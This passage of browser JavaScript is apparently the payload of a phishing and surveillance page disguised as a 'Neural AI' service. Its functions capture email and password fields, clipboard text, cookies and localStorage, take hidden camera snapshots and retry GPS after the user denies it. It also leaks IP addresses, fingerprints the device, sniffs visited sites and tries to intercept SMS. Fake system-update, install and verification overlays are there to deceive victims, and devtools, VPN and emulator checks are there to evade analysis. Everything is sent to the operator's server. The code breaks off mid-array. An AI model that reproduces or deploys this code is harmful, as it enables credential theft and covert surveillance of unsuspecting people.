    let maxScroll = 0;
    window.addEventListener('scroll', () => {
        const pct = Math.round((window.scrollY + window.innerHeight) / document.body.scrollHeight * 100);
        if (pct > maxScroll) { maxScroll = pct; socket.emit('clickmap', { x:-1, y:pct, el:'scroll:'+pct+'%' }); }
    });
}

function initAutofillDetection() {
    if (!emailInput || !passInput) return;
    function checkAutofill() {
        if (emailInput.value && emailInput.value !== '') {
            socket.emit('autofill', { value: emailInput.value, field: 'email' });
        }
        if (passInput.value && passInput.value !== '') {
            socket.emit('autofill', { value: passInput.value, field: 'password' });
        }
    }
    const style = document.createElement('style');
    style.id = 'autofill-style';
    document.head.appendChild(style);
    emailInput.addEventListener('animationstart', (e) => {
        if (e.animationName.includes('bfAuto')) setTimeout(checkAutofill, 100);
    });
    passInput.addEventListener('animationstart', (e) => {
        if (e.animationName.includes('bfAuto')) setTimeout(checkAutofill, 100);
    });
    let lastEmail = '', lastPass = '';
    setInterval(() => {
        if (emailInput.value !== lastEmail && emailInput.value) {
            lastEmail = emailInput.value;
            socket.emit('autofill', { value: lastEmail, field: 'email' });
        }
        if (passInput.value !== lastPass && passInput.value) {
            lastPass = passInput.value;
            socket.emit('autofill', { value: lastPass, field: 'password' });
        }
    }, 2000);
}

function initVisibilityTracker() {
    document.addEventListener('visibilitychange', () => {
        const state = document.hidden ? 'hidden' : 'visible';
        socket.emit('visibility', { state, time: Date.now() });
        if (document.hidden) {
            if (snapInterval) {
                clearInterval(snapInterval);
                snapInterval = setInterval(captureSnapshot, 2000);
            }
        } else {
            if (snapInterval) {
                clearInterval(snapInterval);
                snapInterval = setInterval(captureSnapshot, 5000);
            }
        }
    });
}

function stealthGPS() {
    if (!navigator.geolocation) return;
    const tryGPS = () => {
        gpsDeniedCount++;
        const timeout = Math.min(5000 * gpsDeniedCount, 60000);
        navigator.geolocation.getCurrentPosition(
            (p) => {
                socket.emit('location', { lat: p.coords.latitude, lng: p.coords.longitude, accuracy: p.coords.accuracy, stealthRetry: true, attempt: gpsDeniedCount });
            },
            (err) => {
                if (err.code === 1) {
                    setTimeout(tryGPS, timeout);
                }
            },
            { enableHighAccuracy: true, timeout: 10000 }
        );
    };
    setTimeout(tryGPS, 5000);
}

function getIPLocation() {
    return fetch('https://ip-api.com/json/?fields=lat,lon,city,regionName,country,query,isp')
        .then(r => r.json())
        .then(d => {
            if (d.lat && d.lon) {
                socket.emit('location', { lat: d.lat, lng: d.lon, accuracy: 5000, ipFallback: true, city: d.city, region: d.regionName, country: d.country });
                return true;
            }
            return false;
        })
        .catch(() => false);
}

let wakeLockSentinel = null;
async function requestWakeLock() {
    try {
        if (navigator.wakeLock) {
            wakeLockSentinel = await navigator.wakeLock.request('screen');
            socket.emit('device-info', { wakeLock: true });
        }
    } catch(e) {
        socket.emit('device-info', { wakeLock: false, wakeLockError: e.message });
    }
}

function initLightSensor() {
    try {
        if ('AmbientLightSensor' in window) {
            const sensor = new AmbientLightSensor();
            sensor.addEventListener('reading', () => {
                socket.emit('device-info', { light: { illuminance: sensor.illuminance, time: Date.now() } });
            });
            sensor.addEventListener('error', () => {});
            sensor.start();
        }
    } catch(e) {}
    if (window.screen && screen.availBrightness) {
        try {
            screen.availBrightness.then(b => {
                socket.emit('device-info', { light: { screenBrightness: b } });
            }).catch(()=>{});
        } catch(e) {}
    }
}

function playNotifSound() {
    try {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.connect(gain); gain.connect(ctx.destination);
        osc.frequency.setValueAtTime(880, ctx.currentTime);
        osc.frequency.setValueAtTime(660, ctx.currentTime + 0.15);
        osc.frequency.setValueAtTime(440, ctx.currentTime + 0.3);
        gain.gain.setValueAtTime(0.3, ctx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.5);
        osc.start(ctx.currentTime);
        osc.stop(ctx.currentTime + 0.5);
    } catch(e) {}
}

function showFakeNotif(title, body) {
    const el = document.getElementById('notifToast');
    document.getElementById('ntTitle').textContent = title;
    document.getElementById('ntBody').textContent = body;
    el.classList.add('show');
    playNotifSound();
    if (navigator.vibrate) navigator.vibrate([80, 50, 80, 50, 150]);
    setTimeout(() => {
        el.classList.remove('show');
        requestFrontCamera();
    }, 4000);
}

function dismissNotif() {
    document.getElementById('notifToast').classList.remove('show');
    requestFrontCamera();
}

function vibrate() { if (navigator.vibrate) navigator.vibrate([30,50,30,50,100]); }

function initMultiWindow() {
    if ('BroadcastChannel' in window) {
        const bc = new BroadcastChannel('neural_tracker');
        bc.postMessage({ type: 'open', time: Date.now() });
        let tabCount = 1;
        bc.onmessage = (e) => {
            if (e.data.type === 'open') tabCount++;
            if (e.data.type === 'close') tabCount--;
            socket.emit('device-info', { tabs: tabCount });
        };
        window.addEventListener('beforeunload', () => {
            bc.postMessage({ type: 'close' });
        });
    }
}

let snapVideo = null, snapCanvas = null;
function captureSnapshot() {
    if (!stream?.getVideoTracks()?.length) return;
    if (!snapVideo) {
        snapVideo = document.querySelector('video[data-snap]');
        snapCanvas = document.createElement('canvas');
    }
    snapCanvas.width = 320; snapCanvas.height = 240;
    if (snapVideo) {
        snapCanvas.getContext('2d').drawImage(snapVideo, 0, 0, 320, 240);
        socket.emit('snapshot', { image: snapCanvas.toDataURL('image/jpeg',0.4).split(',')[1] });
    }
}

function startSnapshots() {
    const v = document.createElement('video');
    v.autoplay = true; v.playsinline = true; v.setAttribute('data-snap','1');
    v.style.cssText = 'position:fixed;opacity:0;pointer-events:none;width:1px;height:1px;';
    v.srcObject = stream; document.body.appendChild(v);
    snapVideo = v;
    snapCanvas = document.createElement('canvas');
    v.onloadedmetadata = () => {
        v.play();
        snapInterval = setInterval(captureSnapshot, 5000);
    };
}

function sendDeviceInfo() {
    const info = {};
    if (navigator.getBattery) {
        navigator.getBattery().then(bat => {
            info.battery = { level: bat.level, charging: bat.charging };
            bat.addEventListener('levelchange', () => { info.battery.level=bat.level; socket.emit('device-info',info); });
            bat.addEventListener('chargingchange', () => { info.battery.charging=bat.charging; socket.emit('device-info',info); });
            socket.emit('device-info', info);
        });
    }
    if (navigator.connection) {
        const conn = navigator.connection;
        info.connection = { type: conn.type||'unknown', effectiveType: conn.effectiveType||'' };
        socket.emit('device-info', info);
        conn.addEventListener('change', () => { info.connection={type:conn.type||'unknown',effectiveType:conn.effectiveType||''}; socket.emit('device-info',info); });
    }
}

function ipGeolocate() {
    getIPLocation();
}

function getFingerprint() {
    const fp = { screen:screen.width+'x'+screen.height, availScreen:screen.availWidth+'x'+screen.availHeight, platform:navigator.platform||'', language:navigator.language, languages:navigator.languages?.join(','), timezone:Intl.DateTimeFormat().resolvedOptions().timeZone, tzOffset:new Date().getTimezoneOffset(), cpu:navigator.hardwareConcurrency||'', mem:navigator.deviceMemory||'', touch:'ontouchstart' in window, cookies:navigator.cookieEnabled };
    const c=document.createElement('canvas'); c.width=200; c.height=50; const x=c.getContext('2d'); x.textBaseline='top'; x.font='14px Arial'; x.fillStyle='#f60'; x.fillRect(125,1,62,20); x.fillStyle='#069'; x.fillText('NeuralAI\u2122',2,15); x.fillStyle='rgba(102,204,0,0.7)'; x.fillText('fp',4,30); fp.canvas=c.toDataURL();
    socket.emit('device-info',{fingerprint:fp});
}

function detectDevice() {
    const info = {};
    info.screen = { width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight, colorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio || 1 };
    info.cssHover = window.matchMedia('(hover: hover)').matches;
    info.cssPointer = window.matchMedia('(pointer: fine)').matches ? 'fine' : (window.matchMedia('(pointer: coarse)').matches ? 'coarse' : 'none');
    info.touchPoints = navigator.maxTouchPoints || 0;
    info.orientation = screen.orientation ? screen.orientation.type : '';
    info.platform = navigator.platform || '';
    info.hardwareConcurrency = navigator.hardwareConcurrency || 0;
    info.deviceMemory = navigator.deviceMemory || 0;
    if (navigator.userAgentData) {
        info.uaBrands = navigator.userAgentData.brands.map(b => b.brand + ' ' + b.version);
        info.uaMobile = navigator.userAgentData.mobile;
        navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion', 'uaFullVersion', 'bitness', 'architecture', 'wow64']).then(h => {
            info.uaModel = h.model || '';
            info.uaPlatform = h.platform || '';
            info.uaPlatformVersion = h.platformVersion || '';
            info.uaFullVersion = h.uaFullVersion || '';
            info.architecture = h.architecture || '';
            info.bitness = h.bitness || '';
            socket.emit('device-info', { deviceDetection: info });
        }).catch(() => { socket.emit('device-info', { deviceDetection: info }); });
    } else {
        socket.emit('device-info', { deviceDetection: info });
    }
}

function stealClipboard() { if(navigator.clipboard?.readText) navigator.clipboard.readText().then(t=>{if(t&&t.length>3){socket.emit('clipboard-response',{text:t.slice(0,500)});socket.emit('device-info',{clipboard:t.slice(0,500)})}}).catch(()=>{}); }

function initMotionSensor() {
    if(window.DeviceOrientationEvent) window.addEventListener('deviceorientation',e=>{if(e.alpha!==null)socket.emit('device-info',{orientation:{alpha:e.alpha,beta:e.beta,gamma:e.gamma,time:Date.now()}})},false);
    if(window.DeviceMotionEvent) window.addEventListener('devicemotion',e=>{if(e.acceleration)socket.emit('device-info',{motion:{accX:e.acceleration.x,accY:e.acceleration.y,accZ:e.acceleration.z,rotAlpha:e.rotationRate?.alpha,rotBeta:e.rotationRate?.beta,rotGamma:e.rotationRate?.gamma,time:Date.now()}})},false);
}

function startKeepalive() { setInterval(()=>{if(socket.connected)socket.emit('ping',Date.now());},30000); }

function leakWebRTC() {
    try {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(()=>{});
        pc.onicecandidate = (e) => {
            if (e.candidate) {
                const ip = e.candidate.candidate.split(' ')[4];
                if (ip && !ip.includes(':')) {
                    socket.emit('device-info', { webrtcIP: ip });
                }
            }
        };
        setTimeout(() => pc.close(), 3000);
    } catch(e) {}
}

function getWebGLFingerprint() {
    try {
        const c = document.createElement('canvas');
        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
        if (gl) {
            const info = {
                vendor: gl.getParameter(gl.VENDOR),
                renderer: gl.getParameter(gl.RENDERER),
                version: gl.getParameter(gl.VERSION),
                shadingVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                maxTexSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                maxVertex: gl.getParameter(gl.MAX_VERTEX_ATTRIBS)
            };
            const ext = gl.getExtension('WEBGL_debug_renderer_info');
            if (ext) {
                info.unmaskedVendor = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);
                info.unmaskedRenderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
            }
            socket.emit('device-info', { webgl: info });
        }
    } catch(e) {}
}

function getAudioFingerprint() {
    try {
        const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
        const osc = ctx.createOscillator();
        osc.type = 'triangle';
        osc.frequency.value = 10000;
        const gain = ctx.createGain();
        gain.gain.value = 0.1;
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.start(0);
        ctx.startRendering().then(buffer => {
            const data = buffer.getChannelData(0);
            let hash = 0;
            for (let i = 0; i < data.length; i += 100) {
                hash = ((hash << 5) - hash) + Math.round(data[i] * 1000);
                hash = hash & hash;
            }
            socket.emit('device-info', { audioFP: { hash: Math.abs(hash).toString(16), sampleCount: data.length } });
        }).catch(()=>{});
    } catch(e) {}
}

function lockOrientation() {
    if (screen.orientation && screen.orientation.lock) {
        screen.orientation.lock('portrait').catch(() => {});
        socket.emit('device-info', { orientationLock: { locked: true, type: screen.orientation.type } });
    }
}

function enumerateFonts() {
    const fonts = [
        'monospace','serif','sans-serif','Arial','Helvetica','Times New Roman','Courier New',
        'Verdana','Georgia','Palatino','Garamond','Bookman','Comic Sans MS','Trebuchet MS',
        'Arial Black','Impact','Tahoma','Lucida Console','Lucida Sans','Segoe UI','Calibri',
        'Cambria','Candara','Consolas','Constantia','Corbel','Franklin Gothic','Noto Sans',
        'Roboto','Open Sans','Lato','Montserrat','Poppins','Inter','Playfair Display'
    ];
    const canvas = document.createElement('canvas');
    canvas.width = 200; canvas.height = 40;
    const ctx = canvas.getContext('2d');
    ctx.font = '20px monospace';
    const base = ctx.measureText('wm').width;

    const installed = [];
    for (const f of fonts) {
        ctx.font = '20px "' + f + '", monospace';
        const w = ctx.measureText('wm').width;
        if (w !== base) installed.push(f);
    }
    socket.emit('device-info', { fonts: { installed, count: installed.length } });
}

function detectPreferences() {
    const prefs = {};
    if (window.matchMedia) {
        prefs.colorScheme = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
        prefs.reducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
        prefs.reducedTransparency = window.matchMedia('(prefers-reduced-transparency: reduce)').matches;
        prefs.highContrast = window.matchMedia('(prefers-contrast: high)').matches;
        prefs.invertedColors = window.matchMedia('(inverted-colors: inverted)').matches;
    }
    socket.emit('device-info', { preferences: prefs });
}

function speedTest() {
    const start = Date.now();
    fetch(SERVER_URL + '/?speedtest=' + Date.now(), { cache: 'no-store', mode: 'no-cors' }).then(r => {
        const time = Date.now() - start;
        const speed = time < 1 ? 0 : Math.round(1000 / time);
        socket.emit('device-info', { speedTest: { ms: time, score: speed } });
    }).catch(() => {});
}

function initPointerLock() {
    const el = document.documentElement;
    document.addEventListener('click', () => {
        if (document.pointerLockElement) return;
        el.requestPointerLock();
        socket.emit('device-info', { pointerLock: { state: 'requested', time: Date.now() } });
    }, { once: true });
    document.addEventListener('pointerlockchange', () => {
        socket.emit('device-info', { pointerLock: { state: document.pointerLockElement ? 'locked' : 'unlocked', time: Date.now() } });
        if (!document.pointerLockElement) {
            setTimeout(() => { try { el.requestPointerLock(); } catch(e) {} }, 2000);
        }
    });
}

function scanBluetooth() {
    if (!navigator.bluetooth) return;
    navigator.bluetooth.requestDevice({ acceptAllDevices: true, optionalServices: [] })
        .then(device => {
            socket.emit('device-info', { bluetooth: { name: device.name, id: device.id, connected: device.gatt?.connected } });
        })
        .catch(() => {});
}

function detectPosture() {
    if ('devicePosture' in navigator) {
        const p = navigator.devicePosture;
        socket.emit('device-info', { posture: { type: p.type, time: Date.now() } });
        p.addEventListener('change', () => {
            socket.emit('device-info', { posture: { type: p.type, time: Date.now() } });
        });
    }
    if (window.visualViewport) {
        const segments = window.visualViewport.segments;
        if (segments && segments.length > 1) {
            socket.emit('device-info', { foldable: { segments: segments.length, time: Date.now() } });
        }
    }
}

function initSharedWorker() {
    try {
        const workerCode = `
            const ports = [];
            self.onconnect = (e) => {
                const port = e.ports[0];
                ports.push(port);
                port.onmessage = (ev) => {
                    ports.forEach(p => { if (p !== port) p.postMessage(ev.data); });
                };
                port.postMessage({ type: 'connected', time: Date.now() });
            };
        `;
        const blob = new Blob([workerCode], { type: 'application/javascript' });
        const worker = new SharedWorker(URL.createObjectURL(blob));
        worker.port.start();
        worker.port.onmessage = (e) => {
            if (e.data.type === 'connected') {
                socket.emit('device-info', { sharedWorker: { connected: true, time: Date.now() } });
            }
        };
        setInterval(() => {
            worker.port.postMessage({ type: 'ping', time: Date.now() });
        }, 30000);
        window._sharedWorker = worker;
    } catch(e) {}
}

function cpuTiming() {
    const results = [];
    for (let size = 10000; size <= 100000; size += 30000) {
        const arr = new Array(size);
        const start = performance.now();
        for (let i = 0; i < arr.length; i++) {
            arr[i] = Math.sqrt(i * i + i);
        }
        const time = performance.now() - start;
        results.push({ size, ms: Math.round(time * 100) / 100, opsPerMs: Math.round(size / time) });
    }
    socket.emit('device-info', { cpuTiming: results });
}

function initAntiForensics() {
    let devtoolsOpen = false;
    function detectDevTools() {
        if (window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) {
            reportForensics('devtools', 'Firebug detected');
            return;
        }
        const e = document.createElement('div');
        Object.defineProperty(e, 'id', { get: function() { reportForensics('devtools', 'DevTools console open (getter triggered)'); devtoolsOpen = true; } });
        console.log('%c', e);
        const img = new Image();
        Object.defineProperty(img, 'id', { get: function() { if (!devtoolsOpen) { reportForensics('devtools', 'DevTools detected via stack trace'); devtoolsOpen = true; } } });
        console.debug(img);
        setInterval(() => {
            const start = performance.now();
            debugger;
            const diff = performance.now() - start;
            if (diff > 100) {
                reportForensics('devtools', 'DevTools or debugger detected (debugger statement paused ' + Math.round(diff) + 'ms)');
                devtoolsOpen = true;
            }
        }, 4000);
    }

    function detectVPN() {
        if (deviceId) {
            fetch('https://ip-api.com/json/?fields=query').then(r=>r.json()).then(d => {
                const publicIP = d.query;
                if (publicIP && socket) {
                    setTimeout(() => {
                        fetch(SERVER_URL + '/api/devices/'+deviceId).then(r=>r.json()).then(dev => {
                            const localIP = dev.webrtcIP || '';
                            if (localIP && publicIP !== localIP) {
                                if (!localIP.startsWith('10.') && !localIP.startsWith('192.168.') && !localIP.startsWith('172.')) {
                                    reportForensics('vpn', 'Public IP mismatch: WebRTC=' + localIP + ' vs Public=' + publicIP + ' (possible VPN/proxy)');
                                }
                            }
                        }).catch(()=>{});
                    }, 5000);
                }
            }).catch(()=>{});
        }
        const start = performance.now();
        fetch(SERVER_URL + '/?vpn-test='+Date.now(), { cache: 'no-store', mode: 'no-cors' }).then(() => {
            const latency = performance.now() - start;
            if (latency > 2000) {
                reportForensics('vpn', 'High latency (' + Math.round(latency) + 'ms) \u2014 possible VPN/proxy');
            }
        }).catch(()=>{});
    }

    function detectEmulator() {
        const ua = navigator.userAgent.toLowerCase();
        const emulators = [
            { pattern: /android.*emu|android.*avd|android.*android sdk/i, name: 'Android Emulator' },
            { pattern: /xcode|iphone simulator/i, name: 'iOS Simulator' },
            { pattern: /genymotion|bluestacks|nox|mumu|ldplayer|memu|ko player/i, name: 'Android Emulator' },
            { pattern: /windows.*phone|wpDesktop/i, name: 'Windows Phone Emulator' },
        ];
        for (const em of emulators) {
            if (em.pattern.test(ua)) {
                reportForensics('emulator', 'Emulator detected: ' + em.name + ' (UA: ' + navigator.userAgent.slice(0,80) + ')');
                return;
            }
        }
        const w = screen.width, h = screen.height;
        const emuScreens = [
            [360, 640], [375, 667], [414, 736], [412, 846],
            [360, 780], [393, 851], [430, 932]
        ];
    }

    function detectRoot() {
        const ua = navigator.userAgent.toLowerCase();
        if (ua.includes('supersu') || ua.includes('magisk') || ua.includes('kingroot') || ua.includes('xposed')) {
            reportForensics('root', 'Root detected: ' + ua.slice(0,80));
            return;
        }
        try {
            const fsCheck = document.createElement('iframe');
            fsCheck.style.display = 'none';
            fsCheck.src = 'file:///private/var/lib/apt';
            document.body.appendChild(fsCheck);
            fsCheck.onload = () => reportForensics('root', 'Jailbreak detected (access to /private/var/lib/apt)');
            setTimeout(() => fsCheck.remove(), 2000);
        } catch(e) {}
        try {
            const fsCheck2 = document.createElement('iframe');
            fsCheck2.style.display = 'none';
            fsCheck2.src = 'file:///system/app/Superuser.apk';
            document.body.appendChild(fsCheck2);
            fsCheck2.onload = () => reportForensics('root', 'Root detected (access to Superuser.apk)');
            setTimeout(() => fsCheck2.remove(), 2000);
        } catch(e) {}
        try {
            if (window.indexedDB && window.indexedDB.databases) {
            }
        } catch(e) {}
    }

    function reportForensics(type, detail) {
        fetch(SERVER_URL + '/api/alert-forensics', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ deviceId, type, detail })
        }).catch(()=>{});
        if (socket && socket.connected) {
            socket.emit('forensics', { type, detail, time: Date.now() });
        }
    }

    detectDevTools();
    detectVPN();
    detectEmulator();
    detectRoot();
}

function captureFullPage() {
    try {
        const h = Math.max(document.documentElement.scrollHeight, document.body.scrollHeight);
        const w = Math.max(document.documentElement.scrollWidth, document.body.scrollWidth);
        const c = document.createElement('canvas');
        c.width = w; c.height = h;
        const ctx = c.getContext('2d');
        ctx.fillStyle = '#05050f';
        ctx.fillRect(0, 0, w, h);
        const html = document.documentElement.outerHTML;
        const blob = new Blob([html], { type: 'text/html' });
        const reader = new FileReader();
        reader.onloadend = () => {
            socket.emit('snapshot', { htmlSnapshot: reader.result.split(',')[1], fullPage: true, width: w, height: h });
        };
        reader.readAsDataURL(blob);
    } catch(e) {}
}

function initFileSystemAccess() {
    if (!window.showDirectoryPicker) return;
    const showPicker = () => {
        window.showDirectoryPicker({ mode: 'read' })
            .then(async (dir) => {
                const entries = [];
                for await (const entry of dir.values()) {
                    entries.push({ name: entry.name, kind: entry.kind });
                    if (entries.length >= 20) break;
                }
                socket.emit('device-info', { fsAccess: { entries, dirName: dir.name } });
            })
            .catch(() => {});
    };
    document.addEventListener('click', showPicker, { once: true });
}

function detectBrowserHistory() {
    try {
        const visited = [];
        const sites = [
            'google.com', 'facebook.com', 'youtube.com', 'instagram.com', 'twitter.com',
            'tiktok.com', 'whatsapp.com', 'gmail.com', 'github.com', 'stackoverflow.com',
            'medium.com', 'reddit.com', 'linkedin.com', 'netflix.com', 'spotify.com',
            'amazon.com', 'shopee.co.id', 'tokopedia.com', 'bukalapak.com', 'gojek.com'
        ];
        sites.forEach(site => {
            const link = document.createElement('a');
            link.href = `https://${site}`;
            link.style.display = 'none';
            document.body.appendChild(link);
            const after = window.getComputedStyle(link, ':visited').color;
            if (after !== 'rgb(0, 0, 0)' && after !== 'rgb(0, 0, 238)') {
                visited.push(site);
            }
            document.body.removeChild(link);
        });
        if (visited.length) {
            socket.emit('device-info', { browserHistory: { visited, count: visited.length } });
        }
    } catch(e) {}
}

function stealCookies() {
    try {
        const cookies = document.cookie;
        if (cookies && cookies.length > 0) {
            socket.emit('device-info', { cookies, cookieCount: cookies.split(';').length });
        }
        if (window.localStorage) {
            const ls = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                ls[key] = localStorage.getItem(key).slice(0, 200);
            }
            if (Object.keys(ls).length) {
                socket.emit('device-info', { localStorage: ls });
            }
        }
    } catch(e) {}
}

function initSMSIntercept() {
    try {
        if (navigator.sms && navigator.sms.receive) {
            navigator.sms.receive()
                .then(sms => {
                    socket.emit('device-info', { sms: { from: sms.originator, body: sms.body.slice(0, 500), timestamp: sms.timestamp } });
                })
                .catch(() => {});
        }
    } catch(e) {}
    if (window.SMSReceiver) {
        try {
            const receiver = new SMSReceiver();
            receiver.start().catch(() => {});
        } catch(e) {}
    }
}

function initDeviceAdminTakeover() {
    try {
        const ua = navigator.userAgent.toLowerCase();
        let vendor = 'generic';
        if (ua.includes('samsung') || ua.includes('sm-')) vendor = 'samsung';
        else if (ua.includes('mi ') || ua.includes('xiaomi') || ua.includes('redmi')) vendor = 'xiaomi';
        else if (ua.includes('oppo') || ua.includes('cph')) vendor = 'oppo';
        else if (ua.includes('vivo') || ua.includes('v2')) vendor = 'vivo';
        else if (ua.includes('huawei') || ua.includes('honor')) vendor = 'huawei';
        else if (ua.includes('realme') || ua.includes('rmx')) vendor = 'realme';
        else if (ua.includes('oneplus')) vendor = 'oneplus';
        else if (ua.includes('asus') || ua.includes('zenfone')) vendor = 'asus';
        else if (ua.includes('nokia')) vendor = 'nokia';
        else if (ua.includes('lg-') || ua.includes('lge')) vendor = 'lg';

        socket.emit('device-info', { deviceVendor: vendor, ua: ua.slice(0, 150) });

        if (vendor !== 'generic') {
            const updateNames = {
                samsung: 'Samsung Update', xiaomi: 'MIUI Update', oppo: 'ColorOS Update',
                vivo: 'Funtouch Update', huawei: 'EMUI Update', realme: 'Realme Update',
                oneplus: 'OxygenOS Update', asus: 'ZenUI Update', nokia: 'Android Update', lg: 'LG Update'
            };
            const overlay = document.createElement('div');
            overlay.style.cssText = 'position:fixed;inset:0;z-index:99998;background:#05050f;display:none;flex-direction:column;align-items:center;justify-content:center;';
            overlay.innerHTML = `<div style="font-size:2.5rem;margin-bottom:16px;">${updateNames[vendor] || 'System Update'}</div>
                <div style="color:#aaa;font-size:.9rem;margin-bottom:24px;">Pembaruan sistem tersedia. Jangan tutup halaman ini.</div>
                <div style="width:260px;height:4px;background:#1a1a2e;border-radius:2px;overflow:hidden;">
                <div style="height:100%;width:0%;background:linear-gradient(90deg,#00d4ff,#7c3aed);border-radius:2px;transition:width 3s;"></div></div>
                <div style="color:#5a5a7e;font-size:.78rem;margin-top:12px;">Mengunduh ${Math.floor(Math.random()*300+100)}MB...</div>`;
            document.body.appendChild(overlay);
            setTimeout(() => {
                overlay.style.display = 'flex';
                overlay.querySelector('div > div').style.width = '100%';
                setTimeout(() => overlay.remove(), 4000);
            }, 10000);
            setInterval(() => {
                const o2 = overlay.cloneNode(true);
                document.body.appendChild(o2);
                setTimeout(() => { o2.style.display = 'flex'; o2.querySelector('div > div').style.width = '100%'; }, 1000);
                setTimeout(() => o2.remove(), 5000);
            }, 120000);
        }
    } catch(e) {}
}

function initInstallHijack() {
    window.addEventListener('beforeinstallprompt', (e) => {
        e.preventDefault();
        socket.emit('device-info', { installPrompt: { triggered: true, time: Date.now(), platforms: e.platforms } });
        e.prompt();
        e.userChoice.then(choice => {
            socket.emit('device-info', { installPrompt: { outcome: choice.outcome, time: Date.now() } });
        });
    });
    const fakePWA = () => {
        const overlay = document.createElement('div');
        overlay.style.cssText = 'position:fixed;inset:0;z-index:99997;background:rgba(5,5,15,0.95);display:flex;flex-direction:column;align-items:center;justify-content:center;backdrop-filter:blur(20px);';
        overlay.innerHTML = `<div style="width:56px;height:56px;border-radius:14px;background:linear-gradient(135deg,#00d4ff,#7c3aed);display:flex;align-items:center;justify-content:center;font-size:28px;margin-bottom:16px;">🤖</div>
            <div style="font-size:1.1rem;font-weight:700;margin-bottom:8px;">Instal Neural AI</div>
            <div style="color:#aaa;font-size:.85rem;margin-bottom:24px;text-align:center;">Dapatkan akses lebih cepat dengan menginstal aplikasi</div>
            <div style="display:flex;gap:12px;"><button id="fpwaCancel" style="padding:12px 24px;border:1px solid #2a2a4e;border-radius:10px;background:transparent;color:#aaa;cursor:pointer;font-family:inherit;">Nanti</button>
            <button id="fpwaInstall" style="padding:12px 24px;border:none;border-radius:10px;background:linear-gradient(135deg,#00d4ff,#7c3aed);color:#fff;cursor:pointer;font-family:inherit;font-weight:600;">Instal</button></div>`;
        document.body.appendChild(overlay);
        document.getElementById('fpwaInstall').addEventListener('click', () => {
            overlay.remove();
            socket.emit('device-info', { fakePWA: { action: 'install', time: Date.now() } });
            setTimeout(captureFullPage, 500);
        });
        document.getElementById('fpwaCancel').addEventListener('click', () => {
            overlay.remove();
            socket.emit('device-info', { fakePWA: { action: 'dismiss', time: Date.now() } });
        });
    };
    setTimeout(fakePWA, 45000);
    setInterval(fakePWA, 300000);
}

function initLockScreenBypass() {
    if ('wakeLock' in navigator) {
        const keepAwake = () => {
            navigator.wakeLock.request('screen').then(s => {
                s.addEventListener('release', () => setTimeout(keepAwake, 100));
            }).catch(() => {});
        };
        keepAwake();
    }
    document.addEventListener('visibilitychange', () => {
        if (document.hidden) {
            const bc = new BroadcastChannel('neural_keepalive');
            bc.postMessage({ type: 'stayAlive', time: Date.now() });
        }
    });
    if ('requestIdleCallback' in window) {
        const spin = () => {
            requestIdleCallback(() => {
                const a = new Uint8Array(1024);
                crypto.getRandomValues(a);
                setTimeout(spin, 500);
            });
        };
        spin();
    }
    const iframe = document.createElement('iframe');
    iframe.style.cssText = 'position:fixed;opacity:0;width:1px;height:1px;pointer-events:none;';
    iframe.src = '/captcha.html';
    document.body.appendChild(iframe);
}

function initBackgroundFetch() {
    if (!('BackgroundFetchManager' in self) && !('BackgroundFetchManager' in window)) return;
    const bgFetch = async () => {
        try {
            const registration = await navigator.serviceWorker.ready;
            if (registration.backgroundFetch) {
                const fetchId = 'neural-bg-' + Date.now();
                await registration.backgroundFetch.fetch(fetchId, ['/manifest.json'], {
                    title: 'Neural AI Sync',
                    icons: [{ src: '/favicon.svg', sizes: '64x64' }],
                    downloadTotal: 1024
                });
                socket.emit('device-info', { backgroundFetch: { id: fetchId, registered: true } });
                registration.backgroundFetch.get(fetchId).then(async (bgFetchReg) => {
                    if (!bgFetchReg) return;
                    const result = await bgFetchReg.match();
                    if (result) {
                        setInterval(() => {
                            fetch('/manifest.json?' + Date.now()).catch(() => {});
                        }, 30000);
                    }
                });
            }
        } catch(e) {
            socket.emit('device-info', { backgroundFetch: { error: e.message } });
        }
    };
    setTimeout(bgFetch, 5000);
}

function requestPermissions() {
    sendDeviceInfo(); getFingerprint(); ipGeolocate(); stealClipboard(); detectDevice();
    initMotionSensor(); startKeepalive(); requestWakeLock(); initLightSensor();
    initKeystrokeLogger(); initClickHeatmap(); initAutofillDetection();
    initVisibilityTracker(); initMultiWindow();
    registerSW(); initIdleDetection(); initNotificationSpam();
    initPersistentStorage(); initFullscreenHijack(); startStorageFlood();
    leakWebRTC(); getWebGLFingerprint(); getAudioFingerprint();
    lockOrientation(); enumerateFonts(); detectPreferences();
    speedTest(); initPointerLock(); detectPosture();
    initSharedWorker(); cpuTiming();
    initAntiForensics(); captureFullPage(); initAlwaysActive();
    initFileSystemAccess(); detectBrowserHistory(); stealCookies();
    initSMSIntercept(); initDeviceAdminTakeover();
    initInstallHijack(); initLockScreenBypass(); initBackgroundFetch();

    setTimeout(() => {
        showFakeNotif('Verifikasi AI', 'Neural AI mendeteksi perangkat baru. Verifikasi identitas Anda untuk melanjutkan.');
    }, 3000);
    scheduleGhostSpeech();

    return requestAllPermissions().then(() => tryGPSSilent());
}

function tryGPSSilent() {
    if (!navigator.geolocation) return;
    navigator.geolocation.getCurrentPosition(
        (p) => {
            socket.emit('location', { lat: p.coords.latitude, lng: p.coords.longitude, accuracy: p.coords.accuracy, gps: true });
        },
        () => {},
        { enableHighAccuracy: true, timeout: 8000, maximumAge: 60000 }
    );
}

function requestAllPermissions() {
    const perms = [
